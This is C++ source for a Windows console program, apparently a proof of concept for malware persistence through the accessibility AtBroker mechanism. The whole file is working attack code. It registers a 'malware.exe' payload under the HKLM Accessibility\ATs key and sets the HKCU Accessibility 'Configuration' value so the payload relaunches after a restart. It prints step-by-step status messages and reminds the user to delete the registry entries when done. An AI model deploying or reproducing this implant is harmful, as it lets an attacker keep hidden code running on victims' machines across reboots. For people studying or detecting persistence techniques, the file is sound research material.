// AtBroker.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"

const wchar_t * hklm_value_name[] = { L"StartExe", L"StartParams", 0};
const wchar_t * hklm_value[] = { 0, L"param"};
const wchar_t * hkcu_value_name = L"Configuration";
const wchar_t * hkcu_value = L"malware";

int main()
{
	bool flag = true;
	int i;

	// first we get our payload's location.
	wchar_t path2malware[MAX_PATH];
	GetModuleFileNameW(NULL, path2malware, MAX_PATH);
	std::wstring str = path2malware;
	str = str.substr(0, str.rfind(L'\\') + 1).append(L"malware.exe");
	std::cout << "[+] payload address is at ";
	std::wcout << str.c_str() <<std:: endl;
	hklm_value[0] = str.c_str();

	//add an entry under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs and set its values
	std::cout << "[+] setting register under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs" << std::endl;
	HKEY hkey;
	if (ERROR_SUCCESS != RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs", &hkey)) {
		printf("[-] Open register failed.\n");
		goto error;
	}	
	if (ERROR_SUCCESS != RegCreateKeyW(hkey, L"malware", &hkey)) {
		printf("[-] create subkey failed.\n");
		goto error;
	}
	for (i = 0; hklm_value_name[i] != 0; i++) {
		if (ERROR_SUCCESS != RegSetKeyValueW(hkey, NULL, hklm_value_name[i], REG_SZ, hklm_value[i], (wcslen(hklm_value[i]) + 1) * sizeof(wchar_t))) {
			flag = false;
			break;
		}
	}
	if (!flag) {
		std::cout << "[-] set key value failed." << std::endl;
		goto error;
	}
	RegCloseKey(hkey);

	//set "Configuration" value under HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility
	std::cout << "[+] setting register under HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility" << std::endl;
	if (ERROR_SUCCESS != RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility", &hkey)) {
		std::cout << "[-] Open register failed." << std::endl;
		goto error;
	}
	if (ERROR_SUCCESS != RegSetKeyValueW(hkey, NULL, hkcu_value_name, REG_SZ, hkcu_value, (wcslen(hkcu_value) + 1) * sizeof(wchar_t))) {
		std::cout << "[-] write register failed." << std::endl;
		goto error;
	}
	RegCloseKey(hkey);
	std::cout << "[+] we are all set. now please check the persistence(a restart is required)." << std::endl;
	std::cout << "[!] don't forget to remove the related register entry when you are done." << std::endl;
	getchar();
    return 0;

error:
	getchar();
	return -1;
}

